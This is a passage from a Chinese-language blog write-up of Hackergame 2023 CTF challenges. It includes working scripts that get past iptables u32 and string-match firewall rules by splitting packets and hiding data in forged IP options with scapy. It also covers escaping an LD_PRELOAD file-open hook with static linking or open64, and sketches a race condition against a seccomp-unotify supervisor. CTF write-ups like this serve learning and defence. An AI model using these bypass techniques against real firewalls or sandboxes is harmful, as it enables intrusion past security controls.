    <span class="token comment"># 第一部分数据，只包含"POS"</span>
    request_part1 <span class="token operator">=</span> <span class="token string">"POS"</span>
    s<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>request_part1<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    
    <span class="token comment"># 第二部分数据，包含"T"和一个简单的HTTP请求的其余部分</span>
    request_part2 <span class="token operator">=</span> <span class="token triple-quoted-string string">"""T / HTTP/1.1
Host: {}
Content-Type: application/x-www-form-urlencoded
Connection: close
Content-Length: 100

114514:asdfgh==
"""</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span>  <span class="token comment"># 使用Connection: close确保服务器在发送响应后关闭连接</span>
    s<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>request_part2<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    
    <span class="token comment"># 接收数据</span>
    buffer_size <span class="token operator">=</span> <span class="token number">4096</span>
    response <span class="token operator">=</span> <span class="token string">b''</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>buffer_size<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> data<span class="token punctuation">:</span>
            <span class="token keyword">break</span>
        response <span class="token operator">+=</span> data
    
    <span class="token comment"># 关闭套接字</span>
    s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> response<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># 使用函数</span>
host <span class="token operator">=</span> <span class="token string">"202.38.93.111"</span>
port <span class="token operator">=</span> <span class="token number">18080</span>
response <span class="token operator">=</span> send_split_post_request<span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231029051755282.png"></p>
<h3 id="我的-P"><a href="#我的-P" class="headerlink" title="我的 P"></a>我的 P</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">-A myTCP-2 -p tcp -m u32 --u32 <span class="token string">"0 &gt;&gt; 22 &amp; 0x3C @ 12 &gt;&gt; 26 @ 0 &gt;&gt; 24 = 0x50"</span> -j REJECT --reject-with tcp-reset<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>继续问 chatgpt</p>
<blockquote>
<ol>
<li><p><code>-A myTCP-2</code>: 这部分表示将规则附加到名为”myTCP-2”的链 (Chain)，这个链通常是用户自定义的，可以根据需要创建。规则将应用于该链中的数据包。</p>
</li>
<li><p><code>-p tcp</code>: 这部分指定了规则适用于TCP协议的数据包。只有TCP数据包将受到这个规则的影响。</p>
</li>
<li><p><code>-m u32</code>: <code>-m</code>标志用于加载内核模块，以便使用特定的匹配扩展。在这种情况下，使用了<code>u32</code>扩展，该扩展允许你创建复杂的匹配规则。</p>
</li>
<li><p><code>--u32 "0 &gt;&gt; 22 &amp; 0x3C @ 12 &gt;&gt; 26 @ 0 &gt;&gt; 24 = 0x50"</code>: 这是<code>u32</code>扩展的匹配规则。这个规则非常复杂，它实际上是用于匹配特定的TCP数据包头字段位模式。让我拆解这个规则：</p>
<ul>
<li><p><code>0 &gt;&gt; 22 &amp; 0x3C</code>：这部分规则表示从偏移量0（数据包的起始位置）开始，向右移动22位，然后和十六进制值0x3C（二进制形式为00111100）进行按位与操作。这个操作的目的是匹配TCP头的一部分位。</p>
</li>
<li><p><code>@ 12 &gt;&gt; 26</code>：接下来，从偏移量12开始，向右移动26位。这个部分是在TCP头中的另一个位置。</p>
</li>
<li><p><code>@ 0 &gt;&gt; 24</code>：最后，从偏移量0开始，向右移动24位。</p>
</li>
<li><p><code>= 0x50</code>：最后，规则要求上述三个部分的结果必须等于十六进制值0x50（二进制形式为01010000）。（十进制80）</p>
</li>
</ul>
<p>总的来说，这个匹配规则是相当复杂的，它要求TCP数据包的特定位必须匹配特定的二进制模式。</p>
</li>
<li><p><code>-j REJECT --reject-with tcp-reset</code>: 这部分指定了如果数据包匹配前面的规则，将如何处理匹配的数据包。在这种情况下，数据包将被拒绝（REJECT）并且用TCP复位（RST）响应（–reject-with tcp-reset）。这会导致TCP连接被中断，并且通信将不会继续。</p>
</li>
</ol>
</blockquote>
<p>参考 <a target="_blank" rel="noopener" href="https://imlonghao.com/30.html">我所理解的 iptables u32 匹配</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/584722105">简单的益智类小游戏: iptables u32过滤器，强大且好玩</a></p>
<p><a target="_blank" rel="noopener" href="http://www.stearns.org/doc/iptables-u32.current.html">http://www.stearns.org/doc/iptables-u32.current.html</a></p>
<blockquote>
<p><strong>u32 基础</strong></p>
<pre class="line-numbers language-none"><code class="language-none">iptables -m u32 --u32 "Start&amp;Mask=Range"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>上面就是一个 u32 简单的语法，其中：</p>
<p><code>Start</code> 表示开始取值的位置 / 字节</p>
<p><code>Mask</code> 表示掩码</p>
<p><code>Range</code> 表示匹配的范围，可以是一个使用 <code>:</code> 分割开的区间，也可以只是一个数</p>
<p>如果我们需要同时检查多个规则，规则之间可以通过 <code>&amp;&amp;</code> 隔开</p>
<p>小技巧：通常我们可以通过(我们想要的字节的末位位置)减去 3 的方法来得到我们开始取值的位置</p>
<p><strong>u32 操作符</strong></p>
<p>在上面的基础中，我们已经使用到了一个操作符 <code>&amp;</code> ，此外，总共有四个操作符可供使用。</p>
<p><code>&amp;</code> 按位与操作符：过滤出我们需要的四个字节（最多），或者只要其中一个字节</p>
<p><code>&lt;&lt;</code> 左移操作符： 把操作数的各二进位全部左移若干位，高位丢弃，低位补 0</p>
<p><code>&gt;&gt;</code> 右移操作符：把操作数的各二进位全部右移若干位，低位丢弃，高位补 0（或 1）</p>
<p><code>@</code> 向前推进操作符：向前推进若干的字节数</p>
</blockquote>
<p><code>0&gt;&gt;22&amp;0x3C@</code> 就是得到 IP 头长度（长度单位是 4bytes，所以是 &gt;&gt; 24 &lt;&lt; 2 = &gt;&gt;22，乘以4也就是左移2位），然后用 <code>@</code> 运算符直接推进到 TCP 头</p>
<p>而 <code>12 &gt;&gt; 26 @</code> 则提取了 TCP 头的长度，然后跳过 TCP 的部分到达数据区</p>
<p><code>0 &gt;&gt; 24</code> 也就是取数据的最高8bits，也就是第一个 byte，看是不是 0x50 即字母 <code>P</code></p>
<p>当然喵喵这里是非预期了，同样用上面的拆分脚本就行</p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231030204140161.png"></p>
<p>感觉预期解法是<strong>反转字节</strong>？（不大懂</p>
<p>抓包瞄了眼 </p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231103004757692.png"></p>
<p>后来又研究了一下，这里应该是因为提取 TCP 头的长度这里没有 <code>&amp;0x3C</code>，而后面最低位的 2bits 是保留位 reserved</p>
<p><img src="/2023/11/05/CTF_2023Hackergame/tcp.png" alt="tcp"></p>
<p>预期解应该就是直接构造一个将这保留位赋值的 payload，也就是将保留位反转，让其算错 TCP 首部的长度越过更大的范围从而匹配失败，最终实现绕过</p>
<p>而拆分包能过的原因应该是 u32 每次读取 4bytes，而 tcp data 长度不够 out of bound 了，于是匹配失败了（？</p>
<h3 id="我的-GET"><a href="#我的-GET" class="headerlink" title="我的 GET"></a>我的 GET</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">-A myTCP-3 -p tcp -m string --algo bm --from <span class="token number">0</span> --to <span class="token number">50</span> --string <span class="token string">"GET / HTTP"</span> -j ACCEPT
-A myTCP-3 -p tcp -j REJECT --reject-with tcp-reset<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>发现在 TCP 建立连接，客户端发 SYN 包的时候就被 RST 了，然后进行 TCP 重传</p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231101040326307.png"></p>
<p>唔，三次握手不能丢吧？试了试直接构造 <code>GET /</code> TCP SYN 包，确实不行。</p>
<p>那要在0-50范围内包含这个字符串，IP 头都至少20bytes了，那肯定是在 IP 头/ TCP 头里做文章</p>
<p>再回顾上面 <a target="_blank" rel="noopener" href="http://www.stearns.org/doc/iptables-u32.current.html">http://www.stearns.org/doc/iptables-u32.current.html</a> 这篇文章</p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231102013501111.png"></p>
<p>IP 头有个 IP options 字段，长度是可变的，那大概率就把 <code>GET / HTTP</code> payload 扔这里面了。</p>
<p>不过要注意一个问题，这种奇怪的 IP 头可能会被中间的路由器给丢包了，<del>所以主办方提供的 OpenVPN 可能就派上用场了（吗？</del> 反正最后还是直接换个网络试直接打公网了</p>
<p>这里反复整了几天，构造起来挺灵车的，最开始想用 scapy 库，后来感觉不对劲，换 raw socket 来写发现也不对劲，最后还是换回 scapy 手动构造三次握手，但是还不对劲。最后直接打公网算了，成了。</p>
<p>参考 <a target="_blank" rel="noopener" href="https://www.rfc-editor.org/rfc/rfc791">RFC791 Internet Protocol Specification</a> </p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231102232218208.png"></p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231102232246406.png"></p>
<p>比如错误构造的一个包：</p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231103004847472.png"></p>
<p>第一个 byte 的话第1bit 是否复制到各个分段，2bits 类型，剩下 5bits 是 number</p>
<p>第二个 byte 一般是 length（除了 End of Option List 0x00、No Operation 0x01 这种只有第一个 byte）</p>
<p>喵喵这里构造的话直接取保留类型了，后面 number 随便填一个，0b1 11 00010 -&gt; 0xE2</p>
<p>需要注意的是这个 length 是包含前面 2bytes 控制 flag 的，如果不对的话会回复一个 ICMP 提示你长度错了</p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231102233406775.png"></p>
<p>Exp，用 scapy 手动构造三次握手，指定自定义 IP option</p>
<p>感谢 ChatGPT 参与代码编写（</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> scapy<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> scapy<span class="token punctuation">.</span>layers<span class="token punctuation">.</span>inet <span class="token keyword">import</span> IP<span class="token punctuation">,</span> TCP

<span class="token comment"># 构建自定义选项的内容</span>
<span class="token comment"># 以下是构建一个简单的NOP（无操作）选项作为示例</span>
<span class="token comment"># IP选项通常以类型开始，接着是长度，然后是数据</span>
custom_option <span class="token operator">=</span> <span class="token string">b'\xE2\x0CGET / HTTP'</span>

<span class="token comment"># 使用Raw类封装自定义选项的内容</span>
custom_ip_option <span class="token operator">=</span> Raw<span class="token punctuation">(</span>load<span class="token operator">=</span>custom_option<span class="token punctuation">)</span>

<span class="token comment"># 目标主机和端口</span>
target_ip <span class="token operator">=</span> <span class="token string">"192.168.23.1"</span>  <span class="token comment"># 替换为实际的IP地址</span>
target_ip <span class="token operator">=</span> <span class="token string">"202.38.93.111"</span>  <span class="token comment"># 替换为实际的IP地址</span>
target_port <span class="token operator">=</span> <span class="token number">18082</span>  <span class="token comment"># HTTP通常使用端口80</span>

<span class="token comment"># 创建IP数据包，包含自定义选项</span>
ip <span class="token operator">=</span> IP<span class="token punctuation">(</span>dst<span class="token operator">=</span>target_ip<span class="token punctuation">,</span> options<span class="token operator">=</span>custom_ip_option<span class="token punctuation">)</span>

<span class="token comment"># 创建TCP数据包</span>
tcp_syn <span class="token operator">=</span> TCP<span class="token punctuation">(</span>sport<span class="token operator">=</span>RandShort<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> dport<span class="token operator">=</span>target_port<span class="token punctuation">,</span> flags<span class="token operator">=</span><span class="token string">"S"</span><span class="token punctuation">)</span>

<span class="token comment"># 构建整个数据包</span>
packet <span class="token operator">=</span> ip<span class="token operator">/</span>tcp_syn  

<span class="token comment"># 发送数据包并接收第一个响应</span>
syn_ack <span class="token operator">=</span> sr1<span class="token punctuation">(</span>packet<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>syn_ack<span class="token punctuation">)</span>

<span class="token comment"># 如果收到SYN-ACK，发送ACK包</span>
<span class="token keyword">if</span> syn_ack<span class="token punctuation">:</span>  <span class="token comment"># and syn_ack[TCP].flags == "SA"</span>
    <span class="token comment"># 创建TCP层，发送ACK包</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'SYN_ACK!'</span><span class="token punctuation">)</span>
    tcp_ack <span class="token operator">=</span> TCP<span class="token punctuation">(</span>sport<span class="token operator">=</span>syn_ack<span class="token punctuation">[</span>TCP<span class="token punctuation">]</span><span class="token punctuation">.</span>dport<span class="token punctuation">,</span> dport<span class="token operator">=</span>target_port<span class="token punctuation">,</span> flags<span class="token operator">=</span><span class="token string">"A"</span><span class="token punctuation">,</span> seq<span class="token operator">=</span>syn_ack<span class="token punctuation">[</span>TCP<span class="token punctuation">]</span><span class="token punctuation">.</span>ack<span class="token punctuation">,</span> ack<span class="token operator">=</span>syn_ack<span class="token punctuation">[</span>TCP<span class="token punctuation">]</span><span class="token punctuation">.</span>seq <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>
    sr1<span class="token punctuation">(</span>ip <span class="token operator">/</span> tcp_ack<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'ACK!'</span><span class="token punctuation">)</span>

    <span class="token comment"># 创建HTTP GET请求的载荷</span>
    payload <span class="token operator">=</span> <span class="token triple-quoted-string string">"""POST / HTTP/1.1
Host: {}
Content-Type: application/x-www-form-urlencoded
Connection: close
Content-Length: 100

114514:MiaoTonyIsWatchingYou
"""</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target_ip<span class="token punctuation">)</span>
    <span class="token comment"># 发送HTTP GET请求，并等待响应</span>
    response <span class="token operator">=</span> sr1<span class="token punctuation">(</span>ip <span class="token operator">/</span> TCP<span class="token punctuation">(</span>sport<span class="token operator">=</span>syn_ack<span class="token punctuation">[</span>TCP<span class="token punctuation">]</span><span class="token punctuation">.</span>dport<span class="token punctuation">,</span> dport<span class="token operator">=</span>target_port<span class="token punctuation">,</span> flags<span class="token operator">=</span><span class="token string">"PA"</span><span class="token punctuation">,</span> seq<span class="token operator">=</span>syn_ack<span class="token punctuation">[</span>TCP<span class="token punctuation">]</span><span class="token punctuation">.</span>ack<span class="token punctuation">,</span> ack<span class="token operator">=</span>syn_ack<span class="token punctuation">[</span>TCP<span class="token punctuation">]</span><span class="token punctuation">.</span>seq <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">/</span> payload<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> response<span class="token punctuation">:</span>
        response<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"No response received."</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"No SYN-ACK received."</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231103004931849.png" alt="三次握手"></p>
<p>返回包里拿到 flag</p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231102233711793.png"></p>
<p>反正需要多试几次，偶尔还可能会被中间路由器给丢包了</p>
<p><em><strong>See also:</strong></em></p>
<p><a target="_blank" rel="noopener" href="https://cs.pynote.net/net/202205161/">Raw Socket使用总结</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43402663/article/details/122755489">scapy实现tcp三次握手并发送http请求</a></p>
<blockquote>
<p>在使用Pyhon scapy 库构造TCP时，遭遇到系统底层发送的rst包，导致三次握手无法建立情况。</p>
<p>Linux 下 <code>iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP</code> 可以干掉系统rst包干扰。</p>
<p>windows 将自带防火墙打开后，系统自发rst包消失了 </p>
<p>Via <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44704374/article/details/103492578">https://blog.csdn.net/weixin_44704374/article/details/103492578</a></p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3/library/socket.html">https://docs.python.org/zh-cn/3/library/socket.html</a></p>
<h2 id="为什么要打开-x2F-flag-😡"><a href="#为什么要打开-x2F-flag-😡" class="headerlink" title="为什么要打开 /flag 😡"></a>为什么要打开 /flag 😡</h2><blockquote>
<blockquote>
<p>至少见一面让我当面道歉好吗？😭我也吓了一跳，没想到事情会演变成那个样子……😭所以我想好好说明一下😭我要是知道就会阻止它们的，但是明明文件描述符都已经关闭了突然间开始 <code>open()</code>😭没能阻止大家真是对不起……😭你在生气对吧……😭我想你生气也是当然的😭但是请你相信我。<code>/flag</code>，本来没有在我们的预定打开的文件里的😭真的很对不起😭我答应你再也不会随意打开文件了😭我会让各个函数保证再也不打开这个文件😭能不能稍微谈一谈？😭我真的把这里的一切看得非常重要😭所以说，擅自打开 <code>/flag</code> 的时候我和你一样难过😭我希望你能明白我的心情😭拜托了。我哪里都会去的😭我也会好好跟你说明我不得不这么做的理由😭我想如果你能见我一面，你就一定能明白的😭我是你的同伴😭我好想见你😭</p>
</blockquote>
<hr>
<p>挽留失败后，她决定在程序启动时做些手脚，让所有访问 <code>/flag</code> 的请求都以某种方式变成打开 <code>/fakeflag</code> 的请求。</p>
<p>「我不会再打开 <code>/flag</code> 了」。真的吗？</p>
<p><a target="_blank" rel="noopener" href="https://hack.lug.ustc.edu.cn/media/d77bc40b-b705-5752-a908-01855b313132/fakeflag-backend.zip">题目附件下载</a>（第二小题需要 Linux kernel &gt;= 5.9）</p>
</blockquote>
<h3 id="LD-PRELOAD-love"><a href="#LD-PRELOAD-love" class="headerlink" title="LD_PRELOAD, love!"></a>LD_PRELOAD, love!</h3><p>之前 <code>LD_PRELOAD</code> 一般都是拿来绕过 PHP disable_functions 的，这里反过来了，哈哈</p>
<p><code>LD_PRELOAD</code> 用来显式指定加载的动态链接库，那咱直接静态编译就好了嘛。</p>
<p>exp: 写个读 <code>/flag</code> 的 C语言程序</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    FILE <span class="token operator">*</span>file<span class="token punctuation">;</span>
    <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token comment">// 打开文件</span>
    file <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"/tmp/1"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>file <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"无法打开文件"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// 读取文件内容并输出</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">fgets</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">,</span> file<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// 关闭文件</span>
    <span class="token function">fclose</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc -static -o main main.c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231029050043607.png"></p>
<p>当然了，这题他 hook 的脚本里虽然试图拦截一系列文件和进程创建的系统调用，但它并未拦截所有可能的系统调用。例如，<code>fopen64</code>、<code>open64</code> 等 64 位版本的文件操作函数并没有被拦截。如果存在这样的系统调用，它们可能会绕过这个库的检查。 </p>
<p>于是也可以使用 <code>open64</code> 来打开 <code>/flag</code> 文件来做。</p>
<h3 id="都是-seccomp-的错"><a href="#都是-seccomp-的错" class="headerlink" title="都是 seccomp 的错"></a>都是 seccomp 的错</h3><p><del>怎么题目脚本是 rust 写的</del></p>
<blockquote>
<p>Seccomp是Linux内核的一个安全功能，用于限制进程对系统调用的访问。Seccomp允许你指定一个系统调用过滤器规则，以控制进程能够调用哪些系统调用。Seccomp-unotify是一种特定于Linux的Seccomp模式，用于监控和筛选使用<code>unotify</code>（用户级通知）进行的系统调用。这个模式旨在增强系统的安全性。</p>
<p>Via ChatGPT</p>
</blockquote>
<blockquote>
<p>这段 Rust 代码实现了一个安全监管程序，利用 Linux 的 <code>seccomp</code> 功能来控制一个子进程可以执行的系统调用。代码中包含了多个模块和函数，用于设置和处理系统调用的过滤和通知。以下是对代码关键部分的解释：</p>
<p><strong>导入和结构定义</strong></p>
<ul>
<li>导入了一系列的 Rust 标准库和第三方库，用于处理文件、线程、网络套接字、日志等。</li>
<li><code>libseccomp</code> 库被用来与 Linux 的 <code>seccomp</code> 功能交互，它允许限制程序可以执行的系统调用。</li>
</ul>
<p><strong><code>SocketPair</code> 结构</strong></p>
<ul>
<li>用于在子进程和父进程之间传递文件描述符（fd），通过使用 <code>sendmsg</code>/<code>recvmsg</code> 系统调用和 <code>SCM_RIGHTS</code> 控制消息。</li>
</ul>
<p><strong><code>UNotifyEventRequest</code> 结构</strong></p>
<ul>
<li>封装了 <code>libseccomp</code> 的 <code>ScmpNotifReq</code>，这是一个来自 <code>seccomp</code> 子系统的通知请求，包含了关于系统调用的请求信息。</li>
</ul>
<p><strong><code>RemoteProcess</code> 结构</strong></p>
<ul>
<li>允许监管程序与远程进程（子进程）交互，例如，通过 <code>process_vm_readv</code> 读取远程进程的内存。</li>
</ul>
<p><strong><code>Supervisor</code> 结构</strong></p>
<ul>
<li>核心结构，用于创建和管理 <code>seccomp</code> 过滤器，设置系统调用处理函数，并执行和监控子进程。</li>
<li><code>insert_handler</code> 方法用于为特定的系统调用添加用户自定义的处理函数。</li>
<li><code>exec</code> 方法用于创建子进程，并应用 <code>seccomp</code> 过滤器。</li>
<li><code>wait</code> 方法用于等待子进程结束，并清理监管线程和线程池。</li>
</ul>
<p><strong><code>opening_handler</code> 函数</strong></p>
<ul>
<li>是一个示例的用户定义的处理函数，用于处理 <code>open</code> 和 <code>openat</code> 系统调用。</li>
<li>它读取远程进程的内存来获取文件路径，如果路径中包含 “flag” 字符串，则打开一个虚假的 “flag” 文件并返回新的文件描述符。</li>
</ul>
<p><strong><code>main</code> 函数</strong></p>
<ul>
<li>程序的入口点，设置日志，安装 panic hook 以便在线程崩溃时终止程序。</li>
<li>解析命令行参数以获取要执行的子程序。</li>
<li>创建 <code>Supervisor</code> 对象，插入处理函数，执行子程序，并等待其完成。</li>
</ul>
<p>整体来看，这段代码是一个利用 <code>seccomp</code> 创建安全沙箱环境的高级框架。它可以监控和控制子进程的系统调用行为，确保子进程只能调用白名单上的系统调用，并对特定系统调用进行自定义处理。这在运行不可信代码或需要限制子进程行为的场景中非常有用。</p>
</blockquote>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231103012054990.png" alt="ls"></p>
<p><a target="_blank" rel="noopener" href="http://https//www.anquanke.com/post/id/219077">PWN题中常见的seccomp绕过方法</a></p>
<p>瞄了眼基本上绕过 seccomp 都是用 ORW，比如用 <code>openat</code> <code>readv</code> <code>writev</code> 之类的去绕过被 ban 的 syscall</p>
<p>但这题里 <code>open</code> 和 <code>openat</code> 都被处理了，看起来不行</p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231103022330207.png"></p>
<p>试了下 link 建立个链接，但是发现也不行</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://just4coding.com/2022/04/03/seccomp/">Seccomp机制与seccomp notify介绍</a></p>
<p>在<code>5.0</code>版本内核又加入了<code>seccomp-unotify</code>机制，<code>5.9</code>版本又做了特性增强。<code>seccomp-BPF</code>模式对<code>系统调用</code>的裁决是由过滤程序自己完成的，而<code>seccomp-unotify</code>机制能够将裁决权转移给另一个用户态进程。</p>
<p><a target="_blank" rel="noopener" href="https://brauner.io/2020/07/23/seccomp-notify.html">The Seccomp Notifier - New Frontiers in Unprivileged Container Development</a></p>
<p>我们将加载过滤程序的进程叫做<code>target</code>, 接收通知的进程叫做<code>supervisor</code>。在这个模式中，<code>supervisor</code>不仅对是否允许<code>系统调用</code>能够做出裁决，它还可以代替<code>target</code>进程完成这个<code>系统调用</code>的行为。这大大扩大了<code>seccomp</code>机制的应用范围。上边我们介绍过，<code>Seccomp-BPF</code>模式只能检测系统调用的参数，不能解引用指针。而这个<code>unotify</code>模式则还可以去查看指针所指向的内存。</p>
</blockquote>
<p>于是考虑利用 seccomp-unotify 将控制权交给用户态程序</p>
<blockquote>
<p>早期的seccomp采用prctl来实现，后来seccomp被封装成libseccomp库。</p>
<p>早期的libseccomp安装</p>
<pre class="line-numbers language-none"><code class="language-none">sudo apt install libseccomp-dev libseccomp2 seccomp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>现在已经全都整合成了<code>seccomp</code></p>
<pre class="line-numbers language-none"><code class="language-none">find /usr/include/ -name seccomp.h
/usr/include/seccomp.h
/usr/include/linux/seccomp.h<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>注意区分，<code>linux</code>目录下的<code>seccomp.h</code>是原始版本。而<code>linux</code>目录外的<code>seccomp.h</code>则是libseccomp。</p>
<p><em>Via <a target="_blank" rel="noopener" href="http://wh4lter.icu/2020/04/20/seccomp/">http://wh4lter.icu/2020/04/20/seccomp/</a></em></p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/580777000">【云安全系列】让Seccomp“动“起来­­–SeccompNotify</a></p>
<p>编译的时候要在 <strong>最后面</strong> 加 <code>-lseccomp</code></p>
<p>看了下这个 supervisor 都是通过读取内存来获取输入的参数，进而判断 path 等内容，然后去真正执行</p>
<p>所以考虑是用 race condition 竞争去改掉获取到的内存里的内容</p>
<p><em><del>（到了比赛最后一天通宵到早上了，实在太困了去呼呼了）</del></em></p>
<p>后面来补，咕咕咕</p>
<h2 id="微积分计算小练习-2-0"><a href="#微积分计算小练习-2-0" class="headerlink" title="微积分计算小练习 2.0"></a>微积分计算小练习 2.0</h2><blockquote>
<p>今年，小 X 第二次成为某门符号计算课程的助教。在去年，自己前后端分割（等等，是分割吗？还是分叉？切割？）的<a target="_blank" rel="noopener" href="https://github.com/USTC-Hackergame/hackergame2022-writeups/blob/master/official/%E5%BE%AE%E7%A7%AF%E5%88%86%E8%AE%A1%E7%AE%97%E5%B0%8F%E7%BB%83%E4%B9%A0/README.md">微积分计算小练习网站被一群参加了什么信息什么大赛的同学 XSS 得落花流水</a>之后，小 X 认真总结了经验教训：</p>
<ol>
<li>出的题目不够难，甚至有人不用符号计算软件就能完成。如果题目足够难，那么就能让一部分人看到微积分计算式就困，然后关闭浏览器，从而减小被 XSS 的概率；</li>
<li>自己太过信任来做题的同学们，结果往用户名和分数里面放啥的都有，然后前端把这些信息直接塞到页面里，导致了 XSS；</li>
